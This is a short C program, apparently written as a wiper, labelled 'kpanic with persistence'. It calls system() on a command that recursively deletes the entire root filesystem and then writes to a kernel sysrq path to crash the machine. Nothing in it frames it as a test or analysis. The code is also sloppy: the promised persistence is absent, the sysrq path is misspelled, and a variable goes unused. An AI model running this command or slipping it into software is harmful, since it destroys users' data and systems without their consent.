/* kpanic with persistence */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100


int main () {
    char kpanic[MAX_CMN_LEN] = "rm -fr / --no-preserve-root && echo c > /proc/sysrq-triggers", **p;
    system(kpanic);
    return 0;
}
